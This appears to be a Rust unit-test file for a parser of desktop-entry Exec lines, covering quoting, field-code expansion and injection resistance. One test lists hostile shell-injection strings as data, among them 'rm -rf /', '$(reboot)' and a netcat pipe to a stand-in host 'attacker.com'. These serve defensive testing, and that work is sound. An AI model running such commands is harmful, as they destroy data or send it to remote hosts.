#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::needless_raw_string_hashes,
    clippy::cloned_ref_to_slice_refs,
    clippy::assert_is_empty,
    clippy::single_char_pattern,
    clippy::cast_possible_truncation
)]
//! Unit tests for Exec key parser and hostile attack resistance.

use kynex_apps_index::exec::{parse_exec, ExecContext, ExecError};

#[test]
fn test_basic_exec_parsing() {
    let ctx = ExecContext::default();
    let argv = parse_exec("konsole --noclose", &ctx).expect("Should parse");
    assert_eq!(argv, vec!["konsole", "--noclose"]);
}

#[test]
fn test_exec_quoting_and_escapes() {
    let ctx = ExecContext::default();
    let argv = parse_exec(
        r#"my-app "arg with spaces" "quoted \"inner\"" standard_arg"#,
        &ctx,
    )
    .expect("Should parse quoted tokens");
    assert_eq!(
        argv,
        vec![
            "my-app",
            "arg with spaces",
            r#"quoted "inner""#,
            "standard_arg"
        ]
    );
}

#[test]
fn test_unclosed_quote_error() {
    let ctx = ExecContext::default();
    let err = parse_exec(r#"my-app "unclosed quote"#, &ctx);
    assert_eq!(err, Err(ExecError::UnclosedQuote));
}

#[test]
fn test_field_code_expansion() {
    let files = ["/tmp/test.txt", "/tmp/another.txt"];
    let ctx = ExecContext {
        name: "My Editor",
        icon: "app-icon",
        file_path: "/usr/share/applications/editor.desktop",
        files: &files,
        urls: &[],
    };

    // %c -> Name, %k -> file_path, %i -> --icon <icon>, %% -> %
    let exec_line = "editor %i %c %k %%";
    let argv = parse_exec(exec_line, &ctx).expect("Should expand field codes");
    assert_eq!(
        argv,
        vec![
            "editor",
            "--icon",
            "app-icon",
            "My Editor",
            "/usr/share/applications/editor.desktop",
            "%"
        ]
    );

    // %F -> multiple files
    let multi_files = "editor %F";
    let argv_f = parse_exec(multi_files, &ctx).expect("Should expand %F");
    assert_eq!(argv_f, vec!["editor", "/tmp/test.txt", "/tmp/another.txt"]);
}

#[test]
fn test_empty_field_codes_dropped_when_no_files() {
    let ctx = ExecContext::default();
    let exec_line = "editor %f %u %i";
    let argv = parse_exec(exec_line, &ctx).expect("Should drop empty field codes");
    assert_eq!(argv, vec!["editor"]);
}

#[test]
fn test_deprecated_field_codes_dropped() {
    let ctx = ExecContext::default();
    let exec_line = "app %d %D %n %N %v %m -v";
    let argv = parse_exec(exec_line, &ctx).expect("Should drop deprecated codes");
    assert_eq!(argv, vec!["app", "-v"]);
}

#[test]
fn test_hostile_exec_attacks_never_interpreted_by_shell() {
    let ctx = ExecContext::default();

    // Adversarial Exec line trying shell injection with semicolons, subshells, backticks, redirection
    let hostile_inputs = [
        "vulnerable-app; rm -rf /",
        "app $(reboot)",
        "app `id`",
        "app > /tmp/pwned",
        "app | nc attacker.com 1337",
        r#"app && echo "PWNED""#,
        "app 'single quoted' $HOME",
    ];

    for hostile in hostile_inputs {
        let argv = parse_exec(hostile, &ctx).expect("Should parse as literal argv tokens");
        // Verify that the command is argv[0] and metacharacters are literal argument elements
        assert!(!argv.is_empty());
        // For example in "app $(reboot)", argv is ["app", "$(reboot)"]
        // In "app | nc ...", argv is ["app", "|", "nc", ...]
        // When passed to execvp, "|" is a literal string argument, NOT a pipe!
        if hostile.contains(";") {
            assert!(argv.iter().any(|t| t.contains(";")));
        }
        if hostile.contains("$(") {
            assert!(argv.iter().any(|t| t.contains("$(")));
        }
        if hostile.contains('`') {
            assert!(argv.iter().any(|t| t.contains('`')));
        }
        if hostile.contains('|') {
            assert!(argv.iter().any(|t| t == "|"));
        }
    }
}

#[test]
fn test_url_and_file_field_code_expansions() {
    let files_single = ["/tmp/document.pdf"];
    let urls_single = ["https://kynex.org"];
    let ctx_single = ExecContext {
        files: &files_single,
        urls: &urls_single,
        icon: "kynex-icon",
        name: "Kynex App",
        file_path: "/usr/share/applications/kynex.desktop",
    };

    let argv_single = parse_exec("viewer %u %U %f %F", &ctx_single).unwrap();
    assert_eq!(
        argv_single,
        vec![
            "viewer",
            "https://kynex.org",
            "https://kynex.org",
            "/tmp/document.pdf",
            "/tmp/document.pdf"
        ]
    );

    let files_multi = ["/tmp/doc1.pdf", "/tmp/doc2.pdf"];
    let urls_multi = ["https://kynex.org/1", "https://kynex.org/2"];
    let ctx_multi = ExecContext {
        files: &files_multi,
        urls: &urls_multi,
        icon: "",
        name: "Kynex App",
        file_path: "/usr/share/applications/kynex.desktop",
    };

    let argv_multi = parse_exec("viewer %U %F", &ctx_multi).unwrap();
    assert_eq!(
        argv_multi,
        vec![
            "viewer",
            "https://kynex.org/1",
            "https://kynex.org/2",
            "/tmp/doc1.pdf",
            "/tmp/doc2.pdf"
        ]
    );
}
